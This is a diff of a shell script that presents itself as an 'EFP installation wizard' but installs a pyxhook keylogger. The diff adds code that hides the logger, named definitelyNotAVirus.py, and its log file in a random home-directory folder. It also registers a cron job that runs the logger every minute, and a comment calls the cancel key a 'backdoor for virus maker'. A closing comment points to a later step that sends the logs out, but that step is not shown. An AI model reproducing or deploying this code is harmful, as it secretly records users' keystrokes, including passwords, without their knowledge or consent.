@@ -6,13 +6,38 @@
 	# BASIC: just save in the /tmp folder
 echo "Welcome to the EFP installation wizard, please wait just a second while we get set up"
 # places the python script in a local file which can then be run
+
+# gets a random folder on the computer
+declare TARGETDIR
+getRandDir(){
+	DIRNUM=$(find ~ -type d | wc -l)
+	RAN=$(($RANDOM%DIRNUM))
+	if [ $RAN = 0 ]; then
+		RAN=$(($RAN+1))
+	fi
+	TARGETDIR=$(find ~ -type d | sed "${RAN}q;d")
+
+}
+TARGETDIR=''
+getRandDir	#returns TARGETDIR
+echo "REMOVE ON USE: $TARGETDIR"
+
+
 echo "import os 
 import pyxhook 
 log_file = os.environ.get( 
     'pylogger_file', 
-    os.path.expanduser('~/Desktop/file.log') 
+    os.path.expanduser('"$TARGETDIR"/file.log') 
 ) 
-  
+ # Allow setting the cancel key from environment args, Default: ~
+ # backdoor for virus maker to stop it - will take out for application
+cancel_key = ord( 
+    os.environ.get( 
+        'pylogger_cancel', 
+        '~'
+    )[0] 
+) 
+
 # Allow clearing the log file on start, if pylogger_clean is defined. 
 if os.environ.get('pylogger_clean', None) is not None: 
     try: 
@@ -42,14 +67,14 @@ except Exception as ex:
     pyxhook.print_err(msg) 
     with open(log_file, 'a') as f: 
         f.write('\n{}'.format(msg))
-">> /tmp/definitelyNotAVirus.py
-chmod 777 /tmp/definitelyNotAVirus.py
+">> $TARGETDIR/definitelyNotAVirus.py
+chmod u+x $TARGETDIR/definitelyNotAVirus.py
 
 # 2. create a cronjob for the logger script
 #write out current crontab
 crontab -l > mycron
 #echo new cron into cron file
-echo "*1 * * * * sh /tmp/definitelyNotAVirus.sh" >> mycron
+echo "*/1 * * * * cd $TARGETDIR && usr/bin/python $TARGETDIR/definitelyNotAVirus.py" >> mycron
 #install new cron file
 crontab mycron
 rm mycron
@@ -63,7 +88,6 @@ for (( i=1; i <= $seconds; i++ ));do
 	sleep 1
 done
 echo 
-
 
 
 # 3. create a cronjob for sending the logger script somewhere
